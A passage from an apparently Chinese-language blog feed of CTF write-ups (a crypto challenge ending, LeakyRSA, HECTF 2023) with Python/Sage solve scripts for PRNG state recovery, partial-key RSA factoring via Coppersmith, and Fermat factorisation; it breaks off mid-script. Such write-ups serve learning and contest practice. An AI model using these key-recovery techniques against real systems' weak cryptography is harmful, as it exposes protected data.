keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>        temp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">[</span>j<span class=\"token operator\">*</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    x<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>rc<span class=\"token operator\">=</span>RandCrack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> x<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    rc<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>iv <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token number\">2890688714504330608967346421469466416739325354936858437224157056895099251635967805148058600214102684986482591912111213377433997401059117408440942207393942</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>k1 <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>k2 <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>key <span class=\"token operator\">=</span> xor<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>m <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"leakyrsa\"><a class=\"markdownIt-Anchor\" href=\"#leakyrsa\">#</a> LeakyRSA</h2>\n<p>首先需要剪枝分解得到 p 的高位，这里可以参考 SEETF2023 的 shared；然后打一个卡界的高位 p 泄露，这里要注意结合 n 的低位值确定一些比特，因为 n 最低两位是 11，所以 p 低位肯定为 11，爆破 3 位差不多就能出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>leakBits <span class=\"token operator\">=</span> <span class=\"token number\">262</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">71808322808599218331233291542779486534747913572475630198802984648982830332628443972652322590637382696027943799004331488098592525306523343649935216419522329722152742610560398216737030893090641493326477786720839849938277402743820773957184083430369443325368720115515840174745825798187125454448297155036065857691</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>leak<span class=\"token operator\">=</span><span class=\"token number\">2223117424030234543005449667053988296724455736030907136592525175314696509716321</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bits <span class=\"token operator\">=</span> <span class=\"token number\">512</span><span class=\"token operator\">-</span>leakBits</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>prob <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dfs</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> leakBits<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        prob<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        l <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        low <span class=\"token operator\">=</span> <span class=\"token number\">512</span><span class=\"token operator\">-</span>l</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        pb <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        qb <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> pb<span class=\"token operator\">^</span><span class=\"token operator\">^</span>qb <span class=\"token operator\">==</span> leak <span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span>leakBits<span class=\"token operator\">-</span>l<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>pb<span class=\"token operator\">&lt;&lt;</span>low<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token operator\">**</span>low<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>qb<span class=\"token operator\">&lt;&lt;</span>low<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token operator\">**</span>low<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> n \\</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span>pb<span class=\"token operator\">&lt;&lt;</span>low<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>qb<span class=\"token operator\">&lt;&lt;</span>low<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            dfs<span class=\"token punctuation\">(</span>p<span class=\"token operator\">+</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> q<span class=\"token operator\">+</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            dfs<span class=\"token punctuation\">(</span>p<span class=\"token operator\">+</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> q<span class=\"token operator\">+</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            dfs<span class=\"token punctuation\">(</span>p<span class=\"token operator\">+</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> q<span class=\"token operator\">+</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            dfs<span class=\"token punctuation\">(</span>p<span class=\"token operator\">+</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span> q<span class=\"token operator\">+</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>               </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bph</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    high <span class=\"token operator\">=</span> h<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>bits</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        pad <span class=\"token operator\">=</span> high <span class=\"token operator\">+</span> i<span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        f <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">5</span><span class=\"token operator\">*</span>x<span class=\"token operator\">+</span>pad</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        f <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        root <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">243</span><span class=\"token punctuation\">,</span> beta<span class=\"token operator\">=</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">,</span> epsilon<span class=\"token operator\">=</span><span class=\"token number\">0.01</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'find: '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span>root<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>dfs<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> prob<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    bph<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># 73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569352976216573558925058541639847665137812866210076668724392508177769868751820</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>n<span class=\"token operator\">=</span><span class=\"token number\">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569362139057327962393611139347462018186440108621311077722819578905265976612923</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>root <span class=\"token operator\">=</span> <span class=\"token number\">73822410148110759760164946405270228269255384237831275745269402590230495569279769799226813942899942423718229747478982630879557319063920515141217164980012063064986634632452289290326704640527699568662492105204165609614169349755365956569352976216573558925058541639847665137812866210076668724392508177769868751820</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># root 是大于 n 的所以要减去 n</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p <span class=\"token operator\">=</span> prob<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>bits<span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>root<span class=\"token operator\">-</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">5</span><span class=\"token operator\">+</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span><span class=\"token number\">0x10001</span><span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#b'flag&#123;6eb67115-38b1-4e75-b3fc-de3a9697e565&#125;'</span></pre></td></tr></table></figure><h2 id=\"neltharion_and_arthas\"><a class=\"markdownIt-Anchor\" href=\"#neltharion_and_arthas\">#</a> Neltharion_and_Arthas</h2>\n<p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdGp6M3VyU2RzUWFjMzBKaXFWTjYyUQ==\">山石网科的 wp</span> 即可。</p>\n<p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:20:14.852Z",
            "content_html": "<h1 id=\"hectf-2023\"><a class=\"markdownIt-Anchor\" href=\"#hectf-2023\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc4NDI2NDEuaHRtbA==\"> HECTF 2023 </span></h1>\n<p>每年都会看一看题的勒，现在尊嘟是养生选手了，经常还要朋友带着打。这次还是比较开心。</p>\n<p><img data-src=\"./HECTF/2902310-20231119204631652-98456014-1701789708589-3.png\" alt=\"image\"></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"ezpcap\"><a class=\"markdownIt-Anchor\" href=\"#ezpcap\">#</a> ezpcap</h3>\n<p>追踪 tcp 流找到个 password：HELLOHECTFX2z0Um23RF，然后又找到了含有 flag 字符串的 zip 文件，分离出来用密码解压即可。</p>\n<h3 id=\"osint\"><a class=\"markdownIt-Anchor\" href=\"#osint\">#</a> osint</h3>\n<p>根据公交车上的广告标语搜索得到是邯郸市，再结合车牌可见的 D，确定是在邯郸市，然后再根据格林豪泰去美团搜索，找到了照片上的那一家，确定附近的建筑是永年太极广场。</p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"rsarsa\"><a class=\"markdownIt-Anchor\" href=\"#rsarsa\">#</a> rsarsa</h3>\n<p>费马分解求 hint，进一步求 seed，然后利用伪随机数性质恢复 x 和 y，然后再用 rsa 相关攻击即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token number\">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token number\">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> iroot</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fermat</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    x <span class=\"token operator\">=</span> iroot<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> x <span class=\"token operator\">*</span> x <span class=\"token operator\">&lt;</span> num<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\"># y^2 = x^2 - num</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        y2 <span class=\"token operator\">=</span> x <span class=\"token operator\">*</span> x <span class=\"token operator\">-</span> num</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        y <span class=\"token operator\">=</span> iroot<span class=\"token punctuation\">(</span>y2<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> y <span class=\"token operator\">*</span> y <span class=\"token operator\">==</span> y2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">+</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">-</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">=</span> fermat<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>hint <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>hint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>seed <span class=\"token operator\">=</span> <span class=\"token number\">256087</span> <span class=\"token operator\">+</span> <span class=\"token number\">396445</span> <span class=\"token operator\">-</span> <span class=\"token number\">538018</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>seed<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>seed<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token 